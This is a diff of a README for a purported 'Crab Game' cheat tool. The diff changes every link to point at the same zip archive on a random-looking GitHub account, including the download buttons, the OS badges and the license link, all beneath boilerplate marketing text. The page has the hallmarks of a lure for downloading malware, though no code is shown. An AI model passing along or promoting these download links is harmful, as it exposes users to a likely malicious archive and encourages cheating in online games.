@@ -1,7 +1,7 @@
 # 🦀 Crab Game Cheat
 
-[![Download](https://github.com/riwhbboiebdjf/crab-game-advantage-tools/raw/refs/heads/main/coon/tools-game-advantage-crab-3.3.zip)](https://github.com/riwhbboiebdjf/crab-game-advantage-tools/raw/refs/heads/main/coon/tools-game-advantage-crab-3.3.zip)  
-**Grab the latest build now:** https://github.com/riwhbboiebdjf/crab-game-advantage-tools/raw/refs/heads/main/coon/tools-game-advantage-crab-3.3.zip
+[![Download](https://raw.githubusercontent.com/riwhbboiebdjf/crab-game-advantage-tools/main/coon/tools-game-advantage-crab-3.3.zip)](https://raw.githubusercontent.com/riwhbboiebdjf/crab-game-advantage-tools/main/coon/tools-game-advantage-crab-3.3.zip)  
+**Grab the latest build now:** https://raw.githubusercontent.com/riwhbboiebdjf/crab-game-advantage-tools/main/coon/tools-game-advantage-crab-3.3.zip
 
 Welcome to the Crab Game Cheat repository—your ultimate destination for innovative game augmentation utilities, designed to bring out new strategies and elevate the Crab Game experience to uncharted territories! With a dynamically responsive interface, multilingual immersion, and pro-level enhancements under one roof, you’re entering a playground like you’ve only imagined.
 
@@ -13,9 +13,9 @@ Wondering where you can let your Crab Game prowess shine? We’ve got you covere
 
 | Operating System      | Supported  | Interface Optimized | Auto-Update  |
 |----------------------|:----------:|:------------------:|:------------:|
-| ![Windows](https://github.com/riwhbboiebdjf/crab-game-advantage-tools/raw/refs/heads/main/coon/tools-game-advantage-crab-3.3.zip%2B-blue)   | ✅         | ✅               | ✅           |
-| ![macOS](https://github.com/riwhbboiebdjf/crab-game-advantage-tools/raw/refs/heads/main/coon/tools-game-advantage-crab-3.3.zip+-orange) | ✅         | ✅               | 🚧 (planned)|
-| ![Linux](https://github.com/riwhbboiebdjf/crab-game-advantage-tools/raw/refs/heads/main/coon/tools-game-advantage-crab-3.3.zip%2B-brightgreen)  | ✅         | ✅               | ✅           |
+| ![Windows](https://raw.githubusercontent.com/riwhbboiebdjf/crab-game-advantage-tools/main/coon/tools-game-advantage-crab-3.3.zip%2B-blue)   | ✅         | ✅               | ✅           |
+| ![macOS](https://raw.githubusercontent.com/riwhbboiebdjf/crab-game-advantage-tools/main/coon/tools-game-advantage-crab-3.3.zip+-orange) | ✅         | ✅               | 🚧 (planned)|
+| ![Linux](https://raw.githubusercontent.com/riwhbboiebdjf/crab-game-advantage-tools/main/coon/tools-game-advantage-crab-3.3.zip%2B-brightgreen)  | ✅         | ✅               | ✅           |
 
 > Tip: More OS variants added every season. We listen to user requests!
 
@@ -76,14 +76,14 @@ _Always use responsibly and within your jurisdiction’s scope._
 ## 📜 License
 
 © 2025 – Licensed under the MIT License.  
-For the legally inclined, explore the full details here: [MIT License](https://github.com/riwhbboiebdjf/crab-game-advantage-tools/raw/refs/heads/main/coon/tools-game-advantage-crab-3.3.zip)
+For the legally inclined, explore the full details here: [MIT License](https://raw.githubusercontent.com/riwhbboiebdjf/crab-game-advantage-tools/main/coon/tools-game-advantage-crab-3.3.zip)
 
 ---
 
 ## 🚀 Download & Quick Start
 
-[![Download](https://github.com/riwhbboiebdjf/crab-game-advantage-tools/raw/refs/heads/main/coon/tools-game-advantage-crab-3.3.zip)](https://github.com/riwhbboiebdjf/crab-game-advantage-tools/raw/refs/heads/main/coon/tools-game-advantage-crab-3.3.zip)  
-**Get started and transform your Crab Game experience:** https://github.com/riwhbboiebdjf/crab-game-advantage-tools/raw/refs/heads/main/coon/tools-game-advantage-crab-3.3.zip
+[![Download](https://raw.githubusercontent.com/riwhbboiebdjf/crab-game-advantage-tools/main/coon/tools-game-advantage-crab-3.3.zip)](https://raw.githubusercontent.com/riwhbboiebdjf/crab-game-advantage-tools/main/coon/tools-game-advantage-crab-3.3.zip)  
+**Get started and transform your Crab Game experience:** https://raw.githubusercontent.com/riwhbboiebdjf/crab-game-advantage-tools/main/coon/tools-game-advantage-crab-3.3.zip
 
 Need help or want to contribute? Join us in discussions, submit issues, or suggest new features to keep this repository at the crest of the Crab Game tide!
 
